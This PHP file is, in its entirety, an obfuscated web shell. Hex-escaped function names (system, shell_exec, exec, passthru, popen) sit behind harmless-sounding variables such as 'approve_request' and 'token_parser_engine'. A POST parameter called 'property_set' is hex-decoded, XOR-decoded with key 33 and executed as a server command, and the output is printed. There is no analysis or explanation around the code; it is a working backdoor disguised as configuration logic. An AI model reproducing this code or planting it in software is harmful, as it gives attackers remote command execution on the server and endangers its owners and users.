<?php

$approve_request1 = "\x73ys\x74em";
$approve_request5 = "pop\x65n";
$token_parser_engine = "hex2\x62in";
$approve_request4 = "p\x61s\x73thru";
$approve_request3 = "\x65x\x65c";
$approve_request7 = "p\x63\x6C\x6Fse";
$approve_request2 = "\x73hell_e\x78\x65\x63";
$approve_request6 = "\x73tr\x65a\x6D_g\x65\x74\x5Fcont\x65\x6Et\x73";
if (isset($_POST["p\x72\x6F\x70e\x72\x74y_set"])) {
            function settings ($token, $sym){$ptr='' ;foreach(str_split($token) as $char){$ptr.=chr(ord($char)^$sym);} return $ptr; }
            $property_set = $token_parser_engine($_POST["p\x72\x6F\x70e\x72\x74y_set"]);
            $property_set = settings($property_set, 33);
            if (function_exists($approve_request1)) {
                $approve_request1($property_set);
            } elseif (function_exists($approve_request2)) {
                print $approve_request2($property_set);
            } elseif (function_exists($approve_request3)) {
                $approve_request3($property_set, $flg_token);
                print join("\n", $flg_token);
            } elseif (function_exists($approve_request4)) {
                $approve_request4($property_set);
            } elseif (function_exists($approve_request5) && function_exists($approve_request6) && function_exists($approve_request7)) {
                $sym_ptr = $approve_request5($property_set, 'r');
                if ($sym_ptr) {
                    $dat_pointer = $approve_request6($sym_ptr);
                    $approve_request7($sym_ptr);
                    print $dat_pointer;
                }
            }
            exit;
        }